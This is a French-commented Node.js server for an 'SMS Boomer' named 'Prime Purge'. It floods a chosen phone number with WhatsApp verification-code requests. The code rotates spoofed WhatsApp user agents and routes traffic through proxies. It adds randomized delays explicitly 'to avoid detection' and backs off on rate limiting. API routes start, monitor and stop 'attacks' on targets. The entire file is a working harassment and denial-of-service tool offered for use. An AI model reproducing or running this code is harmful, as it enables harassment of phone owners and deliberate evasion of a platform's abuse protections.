// server.js - Prime Purge SMS Boomer
// Version optimisée pour Render.com

const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { v4: uuidv4 } = require('uuid');
const { WebSocketServer } = require('ws');

const app = express();
const PORT = process.env.PORT || 3000;
const WS_PORT = process.env.WS_PORT || 8080;

// --- CONFIGURATION ---
const CONFIG = {
  maxConcurrent: 10,
  delayBetweenRequests: 350,
  maxRequestsPerTarget: 500,
  apiEndpoint: 'https://api.whatsapp.com/v1/account/request_code',
  userAgents: [
    'WhatsApp/2.24.10.76 (Android 14)',
    'WhatsApp/2.24.9.82 (Android 13)',
    'WhatsApp/2.24.8.75 (Android 12)',
    'WhatsApp/2.24.7.84 (iOS 17.4)',
    'WhatsApp/2.24.6.93 (iOS 17.3)',
    'WhatsApp/2.24.5.82 (Android 11)',
    'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.119 Mobile Safari/537.36 WhatsApp/2.24.10.76',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1 WhatsApp/2.24.7.84'
  ]
};

// --- MIDDLEWARE ---
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '/')));

// --- STOCKAGE ---
const attacks = {};
let proxyList = [];

// --- CRÉER LE DOSSIER LOGS SI NÉCESSAIRE ---
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir, { recursive: true });
}

// --- CHARGER LES PROXIES ---
function loadProxies() {
  try {
    const proxyFile = path.join(__dirname, 'proxies.txt');
    if (fs.existsSync(proxyFile)) {
      const data = fs.readFileSync(proxyFile, 'utf8');
      proxyList = data.split('\n')
        .filter(line => line.trim() && line.includes(':'))
        .map(line => {
          const [host, port] = line.trim().split(':');
          return { host, port: parseInt(port) };
        });
      console.log(`📦 ${proxyList.length} proxies chargés`);
    } else {
      console.log('⚠️ Aucun fichier proxies.txt trouvé');
    }
  } catch (error) {
    console.log('⚠️ Erreur chargement proxies:', error.message);
  }
}
loadProxies();

// --- FONCTIONS UTILITAIRES ---
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function getRandomUserAgent() {
  return CONFIG.userAgents[Math.floor(Math.random() * CONFIG.userAgents.length)];
}

function cleanPhoneNumber(number) {
  return number.replace(/^\+/, '').replace(/[^0-9]/g, '');
}

function extractCountryCode(number) {
  const clean = cleanPhoneNumber(number);
  if (clean.startsWith('62')) return '62';
  if (clean.startsWith('1')) return '1';
  if (clean.startsWith('33')) return '33';
  if (clean.startsWith('44')) return '44';
  if (clean.startsWith('91')) return '91';
  if (clean.startsWith('55')) return '55';
  if (clean.startsWith('81')) return '81';
  if (clean.startsWith('86')) return '86';
  return clean.substring(0, 2);
}

// --- ENVOYER UN CODE WHATSAPP ---
async function sendWhatsAppCode(phoneNumber, proxy = null) {
  const cleanNumber = cleanPhoneNumber(phoneNumber);
  const countryCode = extractCountryCode(cleanNumber);
  
  const payload = {
    phone_number: cleanNumber,
    method: 'sms',
    country_code: countryCode
  };

  const headers = {
    'User-Agent': getRandomUserAgent(),
    'Accept': 'application/json',
    'Content-Type': 'application/json',
    'Origin': 'https://web.whatsapp.com',
    'Referer': 'https://web.whatsapp.com/',
    'Accept-Encoding': 'gzip, deflate, br',
    'Accept-Language': 'fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7'
  };

  const config = {
    headers,
    timeout: 10000,
    ...(proxy && { 
      proxy: { 
        host: proxy.host, 
        port: proxy.port 
      } 
    })
  };

  try {
    const response = await axios.post(CONFIG.apiEndpoint, payload, config);
    return { 
      success: true, 
      status: response.status, 
      data: response.data,
      countryCode,
      cleanNumber
    };
  } catch (error) {
    return { 
      success: false, 
      error: error.message, 
      status: error.response?.status || 500,
      data: error.response?.data || null
    };
  }
}

// --- MOTEUR D'ATTAQUE ---
async function startAttack(target, count, type, attackId) {
  const cleanNumber = cleanPhoneNumber(target);
  const maxRequests = Math.min(count, CONFIG.maxRequestsPerTarget);
  
  attacks[attackId] = {
    id: attackId,
    target: cleanNumber,
    status: 'running',
    total: maxRequests,
    sent: 0,
    failed: 0,
    logs: [],
    startTime: Date.now(),
    progress: 0,
    type: type || 'sms'
  };

  let sent = 0;
  let failed = 0;

  for (let i = 0; i < maxRequests; i++) {
    if (attacks[attackId]?.status === 'stopped') {
      break;
    }

    // Sélectionner un proxy aléatoire si disponible
    const proxy = proxyList.length > 0 
      ? proxyList[Math.floor(Math.random() * proxyList.length)] 
      : null;

    const result = await sendWhatsAppCode(cleanNumber, proxy);
    
    if (result.success) {
      sent++;
      attacks[attackId].sent = sent;
    } else {
      failed++;
      attacks[attackId].failed = failed;
      if (result.status === 429) {
        // Rate limiting - on attend plus longtemps
        await sleep(2000);
      }
    }

    attacks[attackId].logs.push({
      time: new Date().toISOString(),
      success: result.success,
      status: result.status || 'N/A',
      error: result.error || null
    });

    attacks[attackId].progress = Math.round((sent / maxRequests) * 100);

    // Délai variable pour éviter la détection
    const delay = CONFIG.delayBetweenRequests + Math.random() * 300;
    await sleep(delay);

    // Pause plus longue si on détecte un rate limiting
    if (result.status === 429) {
      await sleep(3000);
    }
  }

  attacks[attackId].status = 'completed';
  attacks[attackId].endTime = Date.now();
  
  // Sauvegarder les logs
  const logFile = path.join(logsDir, `${attackId}.json`);
  fs.writeFileSync(logFile, JSON.stringify(attacks[attackId], null, 2));
  
  return attacks[attackId];
}

// --- ROUTES API ---

// 1. Démarrer une attaque
app.post('/api/attack/start', async (req, res) => {
  const { target, count = 50, type = 'sms' } = req.body;

  if (!target || target.length < 8) {
    return res.status(400).json({ 
      success: false, 
      error: 'Numéro de téléphone invalide (minimum 8 chiffres)' 
    });
  }

  const cleanNumber = cleanPhoneNumber(target);
  if (cleanNumber.length < 8) {
    return res.status(400).json({ 
      success: false, 
      error: 'Numéro trop court' 
    });
  }

  const attackId = uuidv4().substring(0, 8);
  const totalCount = Math.min(parseInt(count) || 50, CONFIG.maxRequestsPerTarget);

  // Démarrer l'attaque en arrière-plan
  startAttack(cleanNumber, totalCount, type, attackId);

  res.json({
    success: true,
    attackId: attackId,
    target: cleanNumber,
    total: totalCount,
    message: `✅ Attaque lancée sur ${cleanNumber} - ${totalCount} SMS`,
    statusUrl: `/status.html?id=${attackId}`
  });
});

// 2. Statut d'une attaque
app.get('/api/attack/status/:id', (req, res) => {
  const { id } = req.params;
  const attack = attacks[id];
  if (!attack) {
    return res.status(404).json({ 
      success: false, 
      error: 'Attaque non trouvée' 
    });
  }
  
  const duration = attack.endTime 
    ? Math.round((attack.endTime - attack.startTime) / 1000)
    : Math.round((Date.now() - attack.startTime) / 1000);
    
  res.json({
    ...attack,
    duration_seconds: duration,
    logs_recent: attack.logs?.slice(-10) || []
  });
});

// 3. Arrêter une attaque
app.post('/api/attack/stop/:id', (req, res) => {
  const { id } = req.params;
  if (attacks[id]) {
    attacks[id].status = 'stopped';
    return res.json({ 
      success: true, 
      message: '🛑 Attaque arrêtée' 
    });
  }
  res.status(404).json({ 
    success: false, 
    error: 'Attaque non trouvée' 
  });
});

// 4. Lister toutes les attaques
app.get('/api/attacks', (req, res) => {
  const list = Object.keys(attacks).map(id => {
    const attack = attacks[id];
    const duration = attack.endTime 
      ? Math.round((attack.endTime - attack.startTime) / 1000)
      : Math.round((Date.now() - attack.startTime) / 1000);
      
    return {
      id: id,
      target: attack.target,
      sent: attack.sent,
      total: attack.total,
      progress: attack.progress || 0,
      status: attack.status,
      duration_seconds: duration,
      startTime: attack.startTime
    };
  });
  
  res.json(list);
});

// 5. Ajouter des proxies
app.post('/api/proxies/add', (req, res) => {
  const { proxies } = req.body;
  if (!proxies || !Array.isArray(proxies) || proxies.length === 0) {
    return res.status(400).json({ 
      success: false, 
      error: 'Format invalide - fournir un tableau de "host:port"' 
    });
  }

  const newProxies = proxies
    .filter(p => p.trim() && p.includes(':'))
    .map(p => {
      const [host, port] = p.trim().split(':');
      return { host, port: parseInt(port) };
    })
    .filter(p => !isNaN(p.port));

  proxyList = [...proxyList, ...newProxies];
  
  // Sauvegarder
  const proxyFile = path.join(__dirname, 'proxies.txt');
  fs.appendFileSync(proxyFile, proxies.join('\n') + '\n');
  
  res.json({ 
    success: true, 
    count: proxyList.length,
    added: newProxies.length
  });
});

// 6. Stats générales
app.get('/api/stats', (req, res) => {
  const totalAttacks = Object.keys(attacks).length;
  const completedAttacks = Object.values(attacks).filter(a => a.status === 'completed').length;
  const totalSent = Object.values(attacks).reduce((sum, a) => sum + (a.sent || 0), 0);
  
  res.json({
    total_attacks: totalAttacks,
    completed_attacks: completedAttacks,
    total_sms_sent: totalSent,
    active_attacks: totalAttacks - completedAttacks,
    proxies_available: proxyList.length,
    uptime: process.uptime()
  });
});

// --- SERVEUR HTTP ---
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`
😈🔥 PRIME PURGE - BACKEND ACTIF
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🌐 HTTP: http://0.0.0.0:${PORT}
📦 Proxies chargés: ${proxyList.length}
🚀 Mode: ${process.env.NODE_ENV || 'development'}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`);
});

// --- WEBSOCKET SERVER ---
const wss = new WebSocketServer({ 
  server: server,
  path: '/ws'
});

wss.on('connection', (ws) => {
  console.log('🔌 Client WebSocket connecté');
  
  // Envoyer les mises à jour toutes les 2s
  const interval = setInterval(() => {
    if (ws.readyState === ws.OPEN) {
      const data = Object.keys(attacks).map(id => ({
        id: id,
        target: attacks[id].target,
        sent: attacks[id].sent,
        total: attacks[id].total,
        progress: attacks[id].progress || 0,
        status: attacks[id].status,
        startTime: attacks[id].startTime
      }));
      ws.send(JSON.stringify({ 
        type: 'update', 
        timestamp: Date.now(),
        data 
      }));
    }
  }, 2000);

  ws.on('close', () => {
    clearInterval(interval);
    console.log('🔌 Client WebSocket déconnecté');
  });
});

console.log('🔌 WebSocket: ws://0.0.0.0:' + PORT + '/ws');